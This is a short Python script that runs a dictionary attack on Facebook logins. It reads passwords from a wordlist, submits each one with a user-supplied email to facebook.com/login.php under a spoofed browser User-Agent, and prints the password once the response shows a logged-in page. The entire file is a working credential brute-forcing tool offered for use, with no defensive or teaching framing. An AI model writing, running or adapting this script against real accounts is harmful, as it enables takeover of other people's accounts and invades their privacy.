import requests
from os import getcwd, system
from utils import get_element, convert_form_to_dict

settings = {
    "url": "https://www.facebook.com/login.php"
}

session = requests.Session()


def getPage():
    res = session.get(settings["url"])
    return res.text


def main():
    email = input("What your email: ")
    saveLogs = input("Save logs (y/n): ")
    html = getPage()
    formEl = get_element(html, "form")
    data = convert_form_to_dict(formEl)
    file = open(f"{getcwd()}/wordlist1.txt", "r")

    custom_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36",
    }
    session.headers.update(custom_headers)
    while True:

        try:
            line = next(file)
            data["pass"] = line
            data["email"] = email
            res = session.post(settings["url"], data=data)

            if saveLogs == "y":
                log = open(f"{getcwd()}/logs/{line}.html", "w")
                log.write(res.text)

            if ("Terminar sessão" in res.text):
                print("================================ SEARCHED ===================================")
                print(f"Your password: {line}")
                break

            system("clear")
            print("""
                === ===   === ===     =======     =========== ===         ============= =======   ====
                ===    ===    ===   ===      ===  ===     === ===         ===       === ===  ===  ====
                ===    ===    === ===         === ===     === ===         ===       === ===   === ====
                ===           === ===  =====  === ===  ====== ===         ===       === ===    ======
                ===           === ===         === ===     === =========== ============= ===
            """)
            print("...FORCING CRACk...")
        except StopIteration:
            print("SORRY ):")
            break

    file.close()


main()
